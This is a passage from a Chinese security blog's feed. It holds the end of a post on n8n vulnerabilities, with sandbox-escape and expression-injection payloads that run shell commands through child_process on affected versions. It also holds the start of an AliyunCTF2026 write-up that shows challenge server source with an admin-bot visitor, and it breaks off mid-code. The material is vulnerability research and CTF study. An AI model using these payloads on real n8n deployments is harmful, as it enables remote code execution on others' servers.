defined</code>ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> js <span class="token keyword">import</span> requirechild_process <span class="token operator">=</span> require<span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span>output <span class="token operator">=</span> child_process<span class="token punctuation">.</span>execSync<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>toString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"result"</span><span class="token punctuation">:</span> output<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260205112238790.png"></p><p>ä½†æ˜¯å¯¹äº CTFer è€Œè¨€è¦ç»•è¿‡è¿™ä¸ª require è¿˜æ˜¯å¤ªè½»æ¾äº†ï¼Œç›´æ¥ç”¨ <code>process.mainModule</code> å°±è¡Œäº†</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> js<span class="token keyword">try</span><span class="token punctuation">:</span>    output <span class="token operator">=</span> js<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'process.mainModule.require("child_process").execSync("id").toString()'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"result"</span><span class="token punctuation">:</span> output<span class="token punctuation">&#125;</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬è¿˜å¯ä»¥ç”¨ <code>process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;id&quot;).toString()</code> ä½¿ payload é‡Œå®Œå…¨ä¸å‡ºç° require</p><p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260205112739318.png"></p><hr><h1 id="CVE-2026-21877-ä»»æ„æ–‡ä»¶å†™å…¥-RCE"><a href="#CVE-2026-21877-ä»»æ„æ–‡ä»¶å†™å…¥-RCE" class="headerlink" title="CVE-2026-21877 ä»»æ„æ–‡ä»¶å†™å…¥ RCE"></a>CVE-2026-21877 ä»»æ„æ–‡ä»¶å†™å…¥ RCE</h1><p>æ¼æ´å½±å“ï¼š 0.123.0 &lt;&#x3D; n8n &lt; 1.121.3</p><p><a href="https://github.com/Ashwesker/Ashwesker-CVE-2026-21877">https://github.com/Ashwesker/Ashwesker-CVE-2026-21877</a></p><p>ä½œè€…åˆ åº“äº†</p><p>åªèƒ½çœ‹çœ‹è¿™é‡Œçš„ä¿®å¤æ–¹æ³•â€”â€”ç®¡ç†å‘˜å¯ä»¥é€šè¿‡ç¦ç”¨ Git èŠ‚ç‚¹å¹¶é™åˆ¶ä¸å—ä¿¡ä»»ç”¨æˆ·çš„è®¿é—®æƒé™</p><hr><h1 id="CVE-2026-1470-node-è¡¨è¾¾å¼æ³¨å…¥æ²™ç®±é€ƒé€¸"><a href="#CVE-2026-1470-node-è¡¨è¾¾å¼æ³¨å…¥æ²™ç®±é€ƒé€¸" class="headerlink" title="CVE-2026-1470 node è¡¨è¾¾å¼æ³¨å…¥æ²™ç®±é€ƒé€¸"></a>CVE-2026-1470 node è¡¨è¾¾å¼æ³¨å…¥æ²™ç®±é€ƒé€¸</h1><p><a href="https://xz.aliyun.com/news/91575">https://xz.aliyun.com/news/91575</a></p><p>ç‰ˆæœ¬ï¼š&lt; 1.123.17ï¼Œ[2.0.0, 2.4.5)ï¼Œ[2.5.0, 2.5.1)</p><p>payloadï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">var</span> constructor <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span> <span class="token keyword">with</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">"return process.mainModule.require('child_process').execSync('id').toString().trim()"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;è·Ÿè·Ÿæœ€æ–°æœ€çƒ­&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://n8n.akashio.com/about&quot;&gt;https://n8n.akashio.com/about&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://docs.n8n.io/try-it-out/quickstart/#step-one-open-a-workflow-template-and-sign-up-for-n8n-cloud&quot;&gt;https://docs.n8n.io/try-it-out/quickstart/#step-one-open-a-workflow-template-and-sign-up-for-n8n-cloud&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://datawhalechina.github.io/hello-agents/#/./chapter5/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%9F%BA%E4%BA%8E%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%99%BA%E8%83%BD%E4%BD%93%E6%90%AD%E5%BB%BA?id=_54-%e5%b9%b3%e5%8f%b0%e4%b8%89%ef%bc%9an8n&quot;&gt;https://datawhalechina.github.io/hello-agents/#/./chapter5/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%9F%BA%E4%BA%8E%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%99%BA%E8%83%BD%E4%BD%93%E6%90%AD%E5%BB%BA?id=_54-%e5%b9%b3%e5%8f%b0%e4%b8%89%ef%bc%9an8n&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/Chocapikk/CVE-2026-21858&quot;&gt;https://github.com/Chocapikk/CVE-2026-21858&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cyera.com/research-labs/ni8mare-unauthenticated-remote-code-execution-in-n8n-cve-2026-21858&quot;&gt;https://www.cyera.com/research-labs/ni8mare-unauthenticated-remote-code-execution-in-n8n-cve-2026-21858&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://0d000721999.github.io/p/cve-2026-21858%E5%A4%8D%E7%8E%B0n8n%E6%9C%AA%E6%8E%88%E6%9D%83rce&quot;&gt;https://0d000721999.github.io/p/cve-2026-21858%E5%A4%8D%E7%8E%B0n8n%E6%9C%AA%E6%8E%88%E6%9D%83rce&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/wioui/n8n-CVE-2025-68613-exploit&quot;&gt;https://github.com/wioui/n8n-CVE-2025-68613-exploit&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/n8n-Pyodide-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2025-68668.md&quot;&gt;https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/n8n-Pyodide-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2025-68668.md&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.smartkeyss.com/post/cve-2025-68668-breaking-out-of-the-python-sandbox-in-n8n&quot;&gt;https://www.smartkeyss.com/post/cve-2025-68668-breaking-out-of-the-python-sandbox-in-n8n&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="CVE" scheme="http://c1oudfl0w0.github.io/blog/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>AliyunCTF2026</title>
    <link href="http://c1oudfl0w0.github.io/blog/2026/01/31/AliyunCTF2026/"/>
    <id>http://c1oudfl0w0.github.io/blog/2026/01/31/AliyunCTF2026/</id>
    <published>2026-01-31T02:25:04.000Z</published>
    <updated>2026-02-05T03:51:24.528Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p><img src="/blog/2026/01/31/AliyunCTF2026/IMG-20260201220549354.png"></p><p>å‚è€ƒï¼š</p><p><a href="https://xz.aliyun.com/news/91567">https://xz.aliyun.com/news/91567</a></p><p><a href="https://mp.weixin.qq.com/s/Xu8bmR0GWKhJX_NTHbdZtA">https://mp.weixin.qq.com/s/Xu8bmR0GWKhJX_NTHbdZtA</a></p><span id="more"></span><hr><h1 id="Easy-Login"><a href="#Easy-Login" class="headerlink" title="Easy Login"></a>Easy Login</h1><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">import</span> dotenv <span class="token keyword">from</span> <span class="token string">'dotenv'</span><span class="token punctuation">;</span><span class="token keyword">import</span> express<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> Request<span class="token punctuation">,</span> Response<span class="token punctuation">,</span> NextFunction <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'express'</span><span class="token punctuation">;</span><span class="token keyword">import</span> cookieParser <span class="token keyword">from</span> <span class="token string">'cookie-parser'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> MongoClient<span class="token punctuation">,</span> Db<span class="token punctuation">,</span> Collection <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'mongodb'</span><span class="token punctuation">;</span><span class="token keyword">import</span> crypto <span class="token keyword">from</span> <span class="token string">'crypto'</span><span class="token punctuation">;</span><span class="token keyword">import</span> path <span class="token keyword">from</span> <span class="token string">'path'</span><span class="token punctuation">;</span><span class="token keyword">import</span> puppeteer <span class="token keyword">from</span> <span class="token string">'puppeteer'</span><span class="token punctuation">;</span>dotenv<span class="token punctuation">.</span><span class="token function">config</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">PORT</span> <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">PORT</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token number">3000</span><span class="token punctuation">;</span><span class="token keyword">const</span> mongoUri <span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">MONGO_URI</span> <span class="token operator">||</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">MONGO_URL</span> <span class="token operator">||</span> <span class="token string">'mongodb://127.0.0.1:27017/easy_login'</span><span class="token punctuation">;</span><span class="token keyword">const</span> dbName <span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">MONGO_DB_NAME</span> <span class="token operator">||</span> <span class="token string">'easy_login'</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">FLAG</span> <span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">FLAG</span> <span class="token operator">||</span> <span class="token string">'flag&#123;dummy_flag_for_testing&#125;'</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">APP_INTERNAL_URL</span> <span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">APP_INTERNAL_URL</span> <span class="token operator">||</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://127.0.0.1:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">PORT</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">ADMIN_PASSWORD</span> <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">interface</span> <span class="token class-name">UserDoc</span> <span class="token punctuation">&#123;</span>  username<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>  password<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">interface</span> <span class="token class-name">SessionDoc</span> <span class="token punctuation">&#123;</span>  sid<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>  username<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>  createdAt<span class="token operator">:</span> Date<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">interface</span> <span class="token class-name">AuthedRequest</span> <span class="token keyword">extends</span> <span class="token class-name">Request</span> <span class="token punctuation">&#123;</span>  user<span class="token operator">?</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> username<span class="token operator">:</span> <span class="token builtin">string</span> <span class="token punctuation">&#125;</span> <span class="token operator">|</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  collections<span class="token operator">?</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    users<span class="token operator">:</span> Collection<span class="token operator">&lt;</span>UserDoc<span class="token operator">></span> <span class="token operator">|</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    sessions<span class="token operator">:</span> Collection<span class="token operator">&lt;</span>SessionDoc<span class="token operator">></span> <span class="token operator">|</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> db<span class="token operator">:</span> Db <span class="token operator">|</span> <span class="token keyword">null</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">let</span> usersCollection<span class="token operator">:</span> Collection<span class="token operator">&lt;</span>UserDoc<span class="token operator">></span> <span class="token operator">|</span> <span class="token keyword">null</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">let</span> sessionsCollection<span class="token operator">:</span> Collection<span class="token operator">&lt;</span>SessionDoc<span class="token operator">></span> <span class="token operator">|</span> <span class="token keyword">null</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">const</span> publicDir <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'../public'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">runXssVisit</span><span class="token punctuation">(</span>targetUrl<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> targetUrl <span class="token operator">!==</span> <span class="token string">'string'</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^https?:\/\/</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>targetUrl<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'invalid target url'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">const</span> browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    headless<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    args<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'--no-sandbox'</span><span class="token punctuation">,</span> <span class="token string">'--disable-setuid-sandbox'</span><span class="token punctuation">]</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token constant">APP_INTERNAL_URL</span> <span class="token operator">+</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>      waitUntil<span class="token operator">:</span> <span class="token string">'networkidle2'</span><span class="token punctuation">,</span>      timeout<span class="token operator">:</span> <span class="token number">15000</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'#username'</span><span class="token punctuation">,</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> delay<span class="token operator">:</span> <span class="token number">30</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'#password'</span><span class="token punctuation">,</span> <span class="token constant">ADMIN_PASSWORD</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> delay<span class="token operator">:</span> <span class="token number">30</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> <span class="token builtin">Promise</span><span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token punctuation">[</span>      page<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token string">'#loginForm button[type="submit"]'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      page<span class="token punctuation">.</span><span class="token function">waitForResponse</span><span class="token punctuation">(</span>        <span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> res<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">method</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span> timeout<span class="token operator">:</span> <span class="token number">10000</span> <span class="token punctuation">&#125;</span>      <span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">undefined</span><span class="token punctuation">)</span>    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>targetUrl<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> waitUntil<span class="token operator">:</span> <span class="token string">'networkidle2'</span><span class="token punctuation">,</span> timeout<span class="token operator">:</span> <span class="token number">15000</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token builtin">Promise</span></span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">createSessionForUser</span><span class="token punctuation">(</span>user<span class="token operator">:</span> UserDoc<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span><span class="token builtin">string</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>sessionsCollection<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'sessions collection not initialized'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">const</span> sid <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">await</span> sessionsCollection<span class="token punctuation">.</span><span class="token function">insertOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    sid<span class="token punctuation">,</span>    username<span class="token operator">:</span> user<span class="token punctuation">.</span>username<span class="token punctuation">,</span>    createdAt<span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> sid<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> extended<span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">cookieParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>publicDir<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">initMongo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> client <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoClient</span><span class="token punctuation">(</span>mongoUri<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">await</span> client<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  db <span class="token operator">=</span> client<span class="token punctuation">.</span><span class="token function">db</span><span class="token punctuation">(</span>dbName<span class="token punctuation">)</span><span class="token punctuation">;</span>  usersCollection <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token generic-function"><span class="token function">collection</span><span class="token generic class-name"><span class="token operator">&lt;</span>UserDoc<span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token string">'users'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  sessionsCollection <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token generic-function"><span class="token function">collection</span><span class="token generic class-name"><span class="token operator">&lt;</span>SessionDoc<span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token string">'sessions'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">let</span> adminUser <span class="token operator">=</span> <span class="token keyword">await</span> usersCollection<span class="token punctuation">.</span><span class="token function">findOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> username<span class="token operator">:</span> <span class="token string">'admin'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>adminUser<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">await</span> usersCollection<span class="token punctuation">.</span><span class="token function">insertOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      username<span class="token operator">:</span> <span class="token string">'admin'</span><span class="token punctuation">,</span>      password<span class="token operator">:</span> <span class="token constant">ADMIN_PASSWORD</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">await</span> usersCollection<span class="token punctuation">.</span><span class="token function">updateOne</span><span class="token punctuation">(</span>      <span class="token punctuation">&#123;</span> username<span class="token operator">:</span> <span class="token string">'admin'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token punctuation">&#123;</span> $set<span class="token operator">:</span> <span class="token punctuation">&#123;</span> password<span class="token operator">:</span> <span class="token constant">ADMIN_PASSWORD</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  adminUser <span class="token operator">=</span> <span class="token keyword">await</span> usersCollection<span class="token punctuation">.</span><span class="token function">findOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> username<span class="token operator">:</span> <span class="token string">'admin'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">[init] Admin password set to: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">ADMIN_PASSWORD</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">sessionMiddleware</span><span class="token punctuation">(</span>req<span class="token operator">:</span> AuthedRequest<span class="token punctuation">,</span> res<span class="token operator">:</span> Response<span class="token punctuation">,</span> next<span class="token operator">:</span> NextFunction<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> sid <span class="token operator">=</span> req<span class="token punctuation">.</span>cookies<span class="token operator">?.</span>sid <span class="token keyword">as</span> <span class="token builtin">string</span> <span class="token operator">|</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>sid <span class="token operator">||</span> <span class="token operator">!</span>sessionsCollection <span class="token operator">||</span> <span class="token operator">!</span>usersCollection<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    req<span class="token 